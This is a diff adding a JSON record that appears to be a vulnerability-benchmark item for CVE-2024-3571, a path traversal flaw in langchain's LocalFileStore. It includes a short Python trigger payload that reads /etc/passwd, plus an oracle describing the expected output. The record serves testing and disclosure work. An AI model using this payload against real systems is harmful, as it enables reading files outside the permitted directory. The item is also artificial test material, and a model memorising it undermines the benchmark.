@@ -1,0 +1,15 @@
+{
+  "file_id": "23_langchain_huntr_2df3acdc-ee4f-4257-bbf8-a7de3870a9d8",
+  "numeric_id": "23",
+  "library_hint": "langchain",
+  "source": "huntr",
+  "title": "LocalFileStore allows path traversal to read/write arbitrary files due to insufficient path validation",
+  "cve": "CVE-2024-3571",
+  "cwe": "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
+  "library": "langchain",
+  "affected_version": "< 0.0.353",
+  "vulnerable_function": "LocalFileStore.mget, LocalFileStore.mset",
+  "triggerability": "indirect",
+  "trigger_payload": "from langchain.storage import LocalFileStore\nfile_store = LocalFileStore(\"/home\")\nvalue = file_store.mget([\"/etc/passwd\"])\nprint(value)",
+  "oracle": "The server returns the contents of /etc/passwd as a response, demonstrating file read access."
+}
